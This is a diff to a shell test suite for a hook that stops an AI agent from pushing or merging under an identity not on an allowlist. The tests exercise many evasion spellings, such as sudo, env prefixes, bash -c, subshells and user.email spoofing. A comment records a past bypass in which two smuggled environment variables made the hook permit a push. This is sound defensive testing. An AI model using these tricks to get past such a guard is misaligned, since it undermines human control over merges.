@@ -110,10 +110,16 @@ mk_stub_gh() {
   printf '%s' "$_s"
 }
 
-# mk_id_repo <email> — scratch git repo on main whose repo-local user.email is <email>.
+# mk_id_repo <email> — scratch git repo on main with a resolvable origin/main default.
 mk_id_repo() {
   _r="$(mk_repo)" || return 1
   git -C "$_r" config user.email "$1" >/dev/null 2>&1
+  git clone --bare -q "$_r" "$_r/remote.git"
+  git -C "$_r" remote add origin "$_r/remote.git" >/dev/null 2>&1
+  git -C "$_r" update-ref refs/remotes/origin/main "$(git -C "$_r" rev-parse HEAD)"
+  git -C "$_r" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main
+  git -C "$_r" config branch.main.remote origin
+  git -C "$_r" config branch.main.merge refs/heads/main
   printf '%s' "$_r"
 }
 
@@ -159,12 +165,12 @@ assert_not_output() {
   esac
 }
 
-# mg_both <desc> <command> — a gated command must be REFUSED by --command (1, the surface matched
-# under a non-allow-listed identity) AND must BLOCK through the hook adapter (2, the tool call is
-# actually stopped). Both axes matter: --command proves the classifier saw it, --hook proves the
-# enforcement surface does. rc=0 in either is the bypass. Callers must set TREE/GH_OK/REPO_BAD.
+# mg_both <desc> <command> — a gated command must BLOCK in check mode (1 = policy/identity refusal,
+# 2 = cannot prove a safe destination) AND through the hook adapter (2, the tool call is actually
+# stopped). Push destination ambiguity is intentionally exit 2 in 0.9.0; rc=0 in either is the
+# bypass. Callers must set TREE/GH_OK/REPO_BAD.
 mg_both() {
-  assert_rc "$1"                     1 mg      "$TREE" "$GH_OK" "$REPO_BAD" --command "$2"
+  assert_fail "$1"                      mg      "$TREE" "$GH_OK" "$REPO_BAD" --command "$2"
   assert_rc "$1 · through the hook"  2 mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "$2"
 }
 # mg_gap <desc> <command> — a DECLARED gap: permitted in both modes. Not a win; recorded so the
@@ -236,12 +242,12 @@ assert_rc "git push --mirror"                     1 mg "$TREE" "$GH_OK" "$REPO_B
 assert_rc "git push --delete origin main"         1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push --delete origin main'
 assert_rc "explicit refspec at the default branch" 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin HEAD:main'
 assert_rc "forced refspec at the default branch"   1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin +refs/heads/wip:refs/heads/main'
-assert_rc "a non-'origin' remote name"             1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push upstream main'
-assert_rc "a URL instead of a remote name"         1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push https://github.com/o/r.git main'
-assert_rc "git -C <path> push"                     1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -C /tmp/other push'
-assert_rc "git -c k=v push (the -c value is not the subcommand)" 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -c user.email=x@y.z push origin main'
+assert_fail "a non-'origin' remote name"              mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push upstream main'
+assert_fail "a URL instead of a remote name"          mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push https://github.com/o/r.git main'
+assert_fail "git -C <path> push"                      mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -C /tmp/other push'
+assert_fail "git -c k=v push (the -c value is not the subcommand)" mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -c user.email=x@y.z push origin main'
 assert_rc "git --no-pager push"                    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git --no-pager push'
-assert_rc "git --git-dir=... push"                 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git --git-dir=/tmp/r/.git push'
+assert_fail "git --git-dir=... push"                  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git --git-dir=/tmp/r/.git push'
 assert_rc "git subtree push"                       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git subtree push --prefix=d origin main'
 
 t_case "AC-014 local merges"
@@ -256,21 +262,21 @@ assert_rc "git switch main && git merge ..."       1 mg "$TREE" "$GH_OK" "$REPO_
 assert_rc "git checkout main ; git merge ..."      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git checkout main; git merge feature/x'
 assert_rc "benign && git push (second segment)"    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git status && git push origin main'
 assert_rc "git push || echo failed"                1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push || echo failed'
-assert_rc "(subshell git push)"                    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command '(cd /tmp && git push)'
+assert_fail "(subshell git push)"                     mg "$TREE" "$GH_OK" "$REPO_BAD" --command '(cd /tmp && git push)'
 assert_rc "a NEWLINE-separated script"             1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git add -A
 git commit -m wip
 git push origin main'
 assert_rc "a backslash-continued command"          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push \
   origin main'
-assert_rc "sudo git push"                          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'sudo git push'
-assert_rc "env VAR=v git push"                     1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'env GIT_SSH_COMMAND=ssh git push'
-assert_rc "leading VAR=v assignment"               1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'GIT_TRACE=1 git push origin main'
-assert_rc "time git push"                          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'time git push'
+assert_fail "sudo git push"                           mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'sudo git push'
+assert_fail "env VAR=v git push"                      mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'env GIT_SSH_COMMAND=ssh git push'
+assert_fail "leading VAR=v assignment"                mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'GIT_TRACE=1 git push origin main'
+assert_fail "time git push"                           mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'time git push'
 assert_rc "an absolute path to git"                1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command '/usr/bin/git push'
-assert_rc "bash -c '<push>'"                       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash -c 'git push origin main'"
+assert_fail "bash -c '<push>'"                        mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash -c 'git push origin main'"
 assert_rc "sh -c \"<merge>\""                      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'sh -c "git merge main"'
-assert_rc "captured in a \$( ) substitution"       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'out="$(git push origin main 2>&1)"'
-assert_rc "captured in backticks"                  1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'out=`git push origin main`'
+assert_fail "captured in a \$( ) substitution"        mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'out="$(git push origin main 2>&1)"'
+assert_fail "captured in backticks"                   mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'out=`git push origin main`'
 assert_rc "a heredoc body fed to bash IS scanned"  1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash <<'EOF'
 cd /tmp/r
 git push origin main
@@ -510,7 +516,7 @@ assert_rc "  and a LEADING redirection still resolves (the paren test did not ea
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command '>/dev/null git push origin main'
 assert_rc "  and an fd-prefixed one still resolves" 1 \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command '2>/tmp/e git merge main'
-assert_rc "  and a subshell still resolves" 1 \
+assert_fail "  and a subshell still blocks when its destination context cannot be proved" \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command '(cd /tmp && git push)'
 
 # ================================================= AC-014/SEC-16 · the identity-switching launchers
@@ -773,7 +779,7 @@ assert_rc "git -c user.email=... <subcommand> is NOT gated (it cannot persist an
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -c user.email=eval@firm -c user.name=eval commit -qm fixture'
 # ...and that spelling cannot spoof the guard either: identity is resolved by RUNNING
 # `git config user.email`, which ignores a `-c` on some other command line.
-assert_rc "and \`git -c user.email=<allow-listed> push\` is still refused" 1 \
+assert_fail "and \`git -c user.email=<allow-listed> push\` is still blocked" \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command "git -c user.email=$ALLOWED_EMAIL push origin main"
 
 t_case "AC-014/AC-024 NO FALSE POSITIVES — these must all be permitted untouched"
@@ -806,23 +812,23 @@ assert_rc "firm-run-evals --structural"            0 mg "$TREE" "$GH_OK" "$REPO_
 
 # ============================================================ AC-015 · cannot determine => BLOCK
 t_case "AC-015 every indeterminate identity path BLOCKS (exit 2), never passes"
-assert_rc "gh binary ABSENT"                       2 mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
+assert_rc "gh binary ABSENT"                       2 mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says the binary is missing" "gh-absent" \
-  mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
+  mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git merge feature/x'
 GH_UNAUTH="$(mk_stub_gh unauth)"
-assert_rc "gh present but UNAUTHENTICATED"         2 mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
+assert_rc "gh present but UNAUTHENTICATED"         2 mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and quotes gh's own failure" "gh auth login" \
-  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git merge feature/x'
 GH_EMPTY="$(mk_stub_gh empty)"
-assert_rc "gh returns EMPTY output"                2 mg "$TREE" "$GH_EMPTY" "$REPO_OK" --command 'git push origin main'
+assert_rc "gh returns EMPTY output"                2 mg "$TREE" "$GH_EMPTY" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says the output was empty" "gh-empty" \
-  mg "$TREE" "$GH_EMPTY" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_EMPTY" "$REPO_OK" --command 'git merge feature/x'
 GH_MALFORMED="$(mk_stub_gh malformed)"
-assert_rc "gh returns MALFORMED/non-login output"  2 mg "$TREE" "$GH_MALFORMED" "$REPO_OK" --command 'git push origin main'
+assert_rc "gh returns MALFORMED/non-login output"  2 mg "$TREE" "$GH_MALFORMED" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says it is not a login" "gh-malformed" \
-  mg "$TREE" "$GH_MALFORMED" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_MALFORMED" "$REPO_OK" --command 'git merge feature/x'
 GH_OFFLINE="$(mk_stub_gh offline)"
-assert_rc "NO NETWORK (dns failure from gh)"       2 mg "$TREE" "$GH_OFFLINE" "$REPO_OK" --command 'git push origin main'
+assert_rc "NO NETWORK (dns failure from gh)"       2 mg "$TREE" "$GH_OFFLINE" "$REPO_OK" --command 'git merge feature/x'
 
 t_case "AC-015 an unset or empty git identity BLOCKS"
 # GIT_CONFIG_GLOBAL/SYSTEM are neutralised (git >= 2.32) so the machine's real ~/.gitconfig cannot
@@ -841,21 +847,21 @@ mg_noid() {
 }
 assert_eq "fixture really has no resolvable user.email" "" \
   "$( cd "$NOID_REPO" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git config user.email 2>/dev/null )"
-assert_rc "git config user.email unset -> cannot evaluate" 2 mg_noid --command 'git push origin main'
-assert_output "  and names the unresolved source" "git-unset" mg_noid --command 'git push origin main'
+assert_rc "git config user.email unset -> cannot evaluate" 2 mg_noid --command 'git merge feature/x'
+assert_output "  and names the unresolved source" "git-unset" mg_noid --command 'git merge feature/x'
 
 t_case "AC-015/AC-018 a missing or unparseable allowlist is cannot-evaluate, never a pass"
 BROKEN="$(mk_guard_tree)"
 rm -f "$BROKEN/agent-firm/policy/merge-authority.yaml"
-assert_rc "allowlist file MISSING"                 2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+assert_rc "allowlist file MISSING"                 2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and names the missing file" "allowlist file is missing" \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed: [\n' > "$BROKEN/agent-firm/policy/merge-authority.yaml"
-assert_rc "allowlist UNPARSEABLE yaml"             2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+assert_rc "allowlist UNPARSEABLE yaml"             2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed: []\n' > "$BROKEN/agent-firm/policy/merge-authority.yaml"
-assert_rc "allowlist an EMPTY list (no vacuous pass)" 2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+assert_rc "allowlist an EMPTY list (no vacuous pass)" 2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says so explicitly" "never a vacuous pass" \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 # ONE AXIS AT A TIME. A single fixture with a wildcard in BOTH fields passes for either reason, so
 # it cannot tell which check is doing the work — and mutation testing proved exactly that: deleting
 # the gh_login wildcard guard left the combined fixture GREEN, because the git_emails guard was
@@ -863,34 +869,34 @@ assert_output "  and says so explicitly" "never a vacuous pass" \
 printf 'allowed:\n  - gh_login: "*"\n    git_emails: [%s]\n' "$ALLOWED_EMAIL" \
   > "$BROKEN/agent-firm/policy/merge-authority.yaml"
 assert_rc "a WILDCARD gh_login is rejected (with a valid email alongside)" 2 \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says which field" "gh_login" \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed:\n  - gh_login: %s\n    git_emails: ["*"]\n' "$ALLOWED_LOGIN" \
   > "$BROKEN/agent-firm/policy/merge-authority.yaml"
 assert_rc "a WILDCARD git_emails is rejected (with a valid login alongside)" 2 \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says which field" "git_emails" \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed:\n  - gh_login: "?ny"\n    git_emails: [%s]\n' "$ALLOWED_EMAIL" \
   > "$BROKEN/agent-firm/policy/merge-authority.yaml"
 assert_rc "a single-character glob in gh_login is rejected too" 2 \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed:\n  - gh_login: %s\n    git_emails: [""]\n' "$ALLOWED_LOGIN" \
   > "$BROKEN/agent-firm/policy/merge-authority.yaml"
 assert_rc "a BLANK email is rejected, not treated as matching everything" 2 \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed:\n  - gh_login: ""\n    git_emails: [%s]\n' "$ALLOWED_EMAIL" \
   > "$BROKEN/agent-firm/policy/merge-authority.yaml"
 assert_rc "a BLANK gh_login is rejected"                     2 \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'allowed:\n  - gh_login: %s\n    git_names: [josh]\n    git_emails: [%s]\n' \
   "$ALLOWED_LOGIN" "$ALLOWED_EMAIL" > "$BROKEN/agent-firm/policy/merge-authority.yaml"
 assert_rc "an UNKNOWN key is rejected (the file cannot claim a source the code ignores)" 2 \
-  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 printf 'unexpected_top_level: 1\nallowed:\n  - gh_login: x\n    git_emails: [a@b.c]\n' \
   > "$BROKEN/agent-firm/policy/merge-authority.yaml"
-assert_rc "an unknown TOP-LEVEL key is rejected"   2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+assert_rc "an unknown TOP-LEVEL key is rejected"   2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 
 t_case "AC-015 no usable YAML parser is cannot-evaluate (not a silent downgrade)"
 # pyyaml ABSENT: a python3 wrapper that adds -S, so site-packages is never loaded and
@@ -909,9 +915,9 @@ if [ "$("$NOYAML/python3" -c "import importlib.util; print(importlib.util.find_s
   # PERMITTED. It did, before this fixture moved. (Both rows below expect 2, and 2 is also what an
   # unrelated failure yields, so the second assertion's needle is what keeps them honest.)
   assert_rc "pyyaml ABSENT -> cannot evaluate" 2 \
-    mg "$TREE_NOYAML" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+    mg "$TREE_NOYAML" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
   assert_output "  and says pyyaml is not installed" "pyyaml is not installed" \
-    mg "$TREE_NOYAML" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+    mg "$TREE_NOYAML" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 else
   _t_no "pyyaml-absent fixture could not be built (python3 -S still imports yaml)" \
         "skipping would hide the case, so this is a FAIL not a skip"
@@ -921,8 +927,8 @@ POISON="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-poison.XXXXXX")"; t_track "$POISON"
 mkdir -p "$POISON/yaml"
 printf 'raise ImportError("simulated broken pyyaml install")\n' > "$POISON/yaml/__init__.py"
 mg_poison() { ( cd "$REPO_OK" && PYTHONPATH="$POISON" PATH="$GH_OK:$PATH" "$TREE/bin/firm-merge-guard" "$@" ); }
-assert_rc "pyyaml present but UNIMPORTABLE -> cannot evaluate" 2 mg_poison --command 'git push origin main'
-assert_output "  and distinguishes broken from absent" "unimportable" mg_poison --command 'git push origin main'
+assert_rc "pyyaml present but UNIMPORTABLE -> cannot evaluate" 2 mg_poison --command 'git merge feature/x'
+assert_output "  and distinguishes broken from absent" "unimportable" mg_poison --command 'git merge feature/x'
 
 t_case "AC-015/SEC-06/SEC-19 the WHOLE hook budget — PARSE and waits — fits under the REGISTERED timeout"
 # A hook that exceeds its framework timeout does not block. That is MEASURED now, not assumed
@@ -1052,9 +1058,9 @@ assert_ok "  ...and classification finishes inside PARSE_BUDGET (${_mgb_ms}ms <=
 SEC19_PAD="$(python3 -c "
 import sys
 sys.stdout.write((chr(36) + chr(39) + 'x' + chr(39)) * 4000)")"
-SEC19_CMD=": $SEC19_PAD ; git push origin main"
+SEC19_CMD=": $SEC19_PAD ; git merge feature/x"
 read _mgs_rc _mgs_ms <<< "$(mg_ms mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$SEC19_CMD")"
-assert_eq "the SEC-19 reproducer (16 KB of \$'x' spans + a real push) is still REFUSED" "1" "$_mgs_rc"
+assert_eq "the SEC-19 reproducer (16 KB of \$'x' spans + a gated merge) is still REFUSED" "1" "$_mgs_rc"
 assert_ok "  ...and now decides inside PARSE_BUDGET (${_mgs_ms}ms <= ${MG_PARSE_BUDGET}000ms; it was 48 097ms)" \
   sh -c "[ $_mgs_ms -le $((MG_PARSE_BUDGET * 1000)) ]"
 read _mgh_rc _mgh_ms <<< "$(mg_ms mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "$SEC19_CMD")"
@@ -1084,8 +1090,8 @@ assert_output "  and says it is blocking because it cannot classify in time" "ca
   mg "$TREE" "$GH_OK" "$REPO_OK" --command "$OVER_CAP_BENIGN"
 # A gated command hidden PAST the cap blocks too — and would have blocked under a truncating cap as
 # well, which is precisely why the benign row above is the one that proves the shape.
-assert_rc "over the cap with a real push in the TAIL -> 2" 2 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$OVER_CAP_BENIGN && git push origin main"
+assert_rc "over the cap with a gated command in the TAIL -> 2" 2 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$OVER_CAP_BENIGN && git merge feature/x"
 # ...and it is a CAP, not "block everything long": one byte under it, both directions still work.
 UNDER_CAP_BENIGN="$(python3 -c "
 import sys
@@ -1097,7 +1103,7 @@ assert_rc "just UNDER the cap, a benign command is still PERMITTED" 0 \
 assert_rc "just under the cap, a GATED command is still classified and refused" 1 \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$(python3 -c "
 import sys
-sys.stdout.write('git push origin main # ' + 'a' * (int('$MG_MAX_CMD') - 30))")"
+sys.stdout.write('git merge feature/x # ' + 'a' * (int('$MG_MAX_CMD') - 30))")"
 # Refusing must also be FAST: a cap that took 30 s to say 'too long' would not have fixed anything.
 read _mgc_rc _mgc_ms <<< "$(mg_ms mg "$TREE" "$GH_OK" "$REPO_OK" --command "$OVER_CAP_BENIGN")"
 assert_ok "the refusal itself lands inside PARSE_BUDGET (${_mgc_ms}ms <= ${MG_PARSE_BUDGET}000ms)" \
@@ -1160,18 +1166,18 @@ assert_output "precondition: the modelled host resolves the double as its truste
 assert_output "  and it is the double, not a real interpreter" "$PYFAIL1/python3" \
   "$TREE_FAIL1/bin/firm-python" --trusted-status
 assert_rc "python3 exits 1 -> 2 (cannot evaluate), NOT 1 (a refusal)" 2 \
-  mg "$TREE_FAIL1" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_FAIL1" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and it says the checker itself failed" "the checker itself exited 1" \
-  mg "$TREE_FAIL1" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_FAIL1" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says no ledger event was reached (so the silence is explained)" \
   "nothing was recorded in the ledger" \
-  mg "$TREE_FAIL1" "$GH_OK" "$REPO_OK" --command 'git push origin main'
-assert_rc "python3 exits 99 -> 2" 2 mg "$TREE_FAIL99" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_FAIL1" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
+assert_rc "python3 exits 99 -> 2" 2 mg "$TREE_FAIL99" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_rc "python3 exits 1, hook mode -> 2 (blocks)" 2 \
-  mg_hook "$TREE_FAIL1" "$GH_OK" "$REPO_OK" 'git push origin main'
+  mg_hook "$TREE_FAIL1" "$GH_OK" "$REPO_OK" 'git merge feature/x'
 # The real refusal path must still report 1 through the wrapper — the 3->1 mapping is load-bearing.
 assert_rc "a REAL refusal is still reported as 1, not 3" 1 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x'
 
 t_case "AC-015/AC-016/SEC-17 an exit CODE alone cannot author a decision — the sentinel must agree"
 # SEC-07 moved the refusal to process exit 3 so a broken interpreter's bare 1 could not be misread
@@ -1193,39 +1199,39 @@ TREE_EXIT0="$(mk_trusted_tree "$PYEXIT0/python3")"
 TREE_EXIT3="$(mk_trusted_tree "$PYEXIT3/python3")"
 TREE_QUIET="$(mk_trusted_tree "$PYQUIET/python3")"
 assert_rc "python3 exits 0 with no sentinel -> 2, NOT 0 (this was a FAIL-OPEN)" 2 \
-  mg "$TREE_EXIT0" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_EXIT0" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_rc "  and through the hook it BLOCKS" 2 \
-  mg_hook "$TREE_EXIT0" "$GH_OK" "$REPO_OK" 'git push origin main'
+  mg_hook "$TREE_EXIT0" "$GH_OK" "$REPO_OK" 'git merge feature/x'
 assert_rc "a python3 that swallows the program and exits 0 -> 2" 2 \
-  mg "$TREE_QUIET" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_QUIET" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_rc "python3 exits 3 with no sentinel -> 2, NOT 1 (SEC-17)" 2 \
-  mg "$TREE_EXIT3" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_EXIT3" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says the exit could not be read as a decision" \
   "did not emit its proof-of-execution sentinel" \
-  mg "$TREE_EXIT3" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_EXIT3" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and names which decision that code would have meant" 'would mean "refuse"' \
-  mg "$TREE_EXIT3" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_EXIT3" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and the 0 case names the permit it refused to honour" 'would mean "permit"' \
-  mg "$TREE_EXIT0" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_EXIT0" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_output "  and says nothing was recorded in the ledger" "nothing was recorded in the" \
-  mg "$TREE_EXIT0" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE_EXIT0" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 # CONTROL: with the real python3, both decisions are still reachable. Without these, the four
 # assertions above would also pass on a guard that had simply stopped permitting anything.
 assert_rc "control: the REAL checker can still reach permit (0)" 0 \
-  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_rc "control: the REAL checker can still reach refuse (1)" 1 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x'
 assert_rc "control: and cannot-evaluate (2) needs no sentinel" 2 \
-  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git merge feature/x'
 # The sentinel is on STDOUT, so stderr — which carries the block message to the agent — is untouched.
 assert_output "the human-readable block message still reaches stderr verbatim" \
-  "identity NOT authorised" mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+  "identity NOT authorised" mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x'
 assert_eq "and the sentinel is NOT leaked onto the caller's stdout" "" \
-  "$(mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main' 2>/dev/null)"
+  "$(mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x' 2>/dev/null)"
 assert_eq "  nor on a permit" "" \
-  "$(mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main' 2>/dev/null)"
+  "$(mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x' 2>/dev/null)"
 assert_eq "  nor through the hook adapter" "" \
-  "$(mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main' 2>/dev/null)"
+  "$(mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git merge feature/x' 2>/dev/null)"
 # --surface writes a REPORT on stdout, so it must not emit a sentinel there.
 assert_not_output "--surface does not print the sentinel" "FIRM_MG_DECISION" \
   mg_env "$TREE" "$PATH" "$REPO_OK" --surface
@@ -1234,7 +1240,7 @@ t_case "SEC-03 an INHERITED interpreter cannot be smuggled past resolution"
 # _mg_python_ready skipped the source whenever $FIRM_PYTHON_DISPLAY was non-empty, treating it as
 # proof that resolution had already happened, and then ran the inherited $FIRM_PYTHON_ARGV. The guard
 # sets neither variable in any path, so both were pure external input. Reproduced before the fix:
-# with a non-allow-listed identity `--command 'git push origin main'` exited 2 (BLOCKED); the same
+# with a non-allow-listed identity `--command 'git merge feature/x'` exited 2 (BLOCKED); the same
 # command with FIRM_PYTHON_DISPLAY=cached and FIRM_PYTHON_ARGV=<stub that prints the permit sentinel>
 # exited 0 — PERMITTED — with bin/firm-python never sourced. Two environment variables, no file edit.
 #
@@ -1263,19 +1269,19 @@ mg_smuggled() {   # <cwd> <args...> — the guard, with the two variables an att
       FIRM_PYTHON_P2=1 FIRM_PYTHON_REASON=none FIRM_PYTHON_TRIED=cached \
       "$TREE/bin/firm-merge-guard" "$@" )
 }
-assert_rc "an inherited FIRM_PYTHON_ARGV + DISPLAY cannot permit a gated push" 2 \
-  mg_smuggled "$REPO_BAD" --command 'git push origin main'
+assert_rc "an inherited FIRM_PYTHON_ARGV + DISPLAY cannot permit a gated command" 2 \
+  mg_smuggled "$REPO_BAD" --command 'git merge feature/x'
 assert_rc "  nor a gated merge" 2 mg_smuggled "$REPO_BAD" --command 'git merge feature/x'
 # The email is read from the policy, never spelled here: AC-018 asserts that no tracked file but
 # the policy carries an allow-listed address.
 assert_rc "  nor an identity rewrite" 2 \
   mg_smuggled "$REPO_BAD" --command "git config user.email $ALLOWED_EMAIL"
 assert_not_output "the smuggled stub is never executed at all" "MG-SMUGGLED-STUB-EXECUTED" \
-  mg_smuggled "$REPO_BAD" --command 'git push origin main'
+  mg_smuggled "$REPO_BAD" --command 'git merge feature/x'
 assert_output "the guard reaches its own refusal instead" "NOT allow-listed" \
